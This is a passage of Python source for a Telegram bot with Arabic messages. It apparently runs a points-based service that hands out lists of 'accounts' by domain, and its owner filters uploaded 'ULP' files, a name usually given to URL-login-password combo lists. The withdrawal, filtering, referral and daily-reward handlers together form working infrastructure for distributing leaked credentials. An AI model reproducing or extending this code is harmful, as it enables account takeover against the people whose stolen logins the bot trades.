            if results:
                file_obj = io.BytesIO("\n".join(results).encode("utf-8"))
                file_obj.name = f"{domain}_{len(results)}.txt"
                await client.send_document(message.chat.id, file_obj, caption=f"✅ {len(results):,} حساب")
                record_withdrawal(user_id, domain, len(results))
                log_search_domain(domain)
                increment_operations()
        else:
            await message.reply(f"🎯 متاح: <b>{available:,}</b>")
        return
    
    if state == "awaiting_delete_domain" and is_owner(user_id):
        user_action_state.pop(user_id, None)
        count = delete_by_domain(text)
        await message.reply(f"🗑 تم حذف <b>{count:,}</b> سطر")
        return
    
    if state == "awaiting_filter_keywords" and is_owner(user_id):
        user_filter_keywords[user_id] = [k.strip().lower() for k in re.split(r'[,|\n]', text) if k.strip()]
        user_action_state[user_id] = "awaiting_ulp_file"
        await message.reply("✅ أرسل ملف ULP الآن")
        return

@app.on_message(filters.document & filters.user(OWNER_IDS))
async def handle_ulp_filter_file(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_action_state.get(user_id)
    
    if state == "awaiting_ulp_file":
        user_action_state.pop(user_id, None)
        keywords = user_filter_keywords.pop(user_id, [])
        temp_path = None
        try:
            msg = await message.reply("⏳ جاري الفرز...")
            temp_path = await message.download()
            
            filtered = []
            seen = set()
            for enc in ['utf-8-sig', 'utf-8', 'latin-1', 'cp1252']:
                try:
                    with open(temp_path, 'r', encoding=enc, errors='ignore') as f:
                        for line in f:
                            line_str = line.strip()
                            if line_str and any(k in line_str.lower() for k in keywords) and line_str not in seen:
                                seen.add(line_str)
                                filtered.append(line_str)
                    break
                except:
                    continue
            
            if filtered:
                output = io.BytesIO("\n".join(filtered).encode("utf-8"))
                output.name = f"filtered_{len(filtered)}.txt"
                await client.send_document(message.chat.id, output, caption=f"✅ {len(filtered):,} سطر")
            else:
                await message.reply("❌ لا توجد نتائج")
            await msg.delete()
        except Exception as e:
            await message.reply(f"❌ خطأ: {e}")
        finally:
            if temp_path and os.path.exists(temp_path):
                os.remove(temp_path)

# ==================== أزرار الأعضاء ====================
@app.on_message(filters.regex("^💰 رصيدي ونقاطي$"))
async def check_balance(client: Client, message: Message):
    row = get_user_row(message.from_user.id)
    await message.reply(f"💎 رصيدك: <b>{row['points']}</b> نقطة\nمستواك: {row['level']}")

@app.on_message(filters.regex("^📋 آخر العمليات$"))
async def last_operations(client: Client, message: Message):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT domain, amount, created_at FROM withdrawals WHERE user_id = ? ORDER BY id DESC LIMIT 5", (message.from_user.id,))
    ops = cursor.fetchall()
    conn.close()
    if not ops:
        await message.reply("📋 لا توجد عمليات")
        return
    text = "📋 <b>آخر العمليات:</b>\n\n"
    for op in ops:
        text += f"• <code>{op['domain']}</code> ({op['amount']:,})\n"
    await message.reply(text)

@app.on_message(filters.regex("^🎁 المكافأة اليومية$"))
async def daily_reward(client: Client, message: Message):
    user_id = message.from_user.id
    row = get_user_row(user_id)
    today = date.today().isoformat()
    if row["last_daily_claim"] == today:
        await message.reply("⚠️ استلمت مكافأتك اليوم")
        return
    add_user_points(user_id, 0.5)
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET last_daily_claim = ? WHERE user_id = ?", (today, user_id))
    conn.commit()
    conn.close()
    await message.reply("✅ استلمت 0.5 نقطة")

@app.on_message(filters.regex("^🔗 رابط الإحالة$"))
async def referral_link(client: Client, message: Message):
    me = await client.get_me()
    await message.reply(f"🔗 رابطك:\n<code>https://t.me/{me.username}?start={message.from_user.id}</code>")

if __name__ == "__main__":
    print("🤖 Bot is running...")
    app.run()
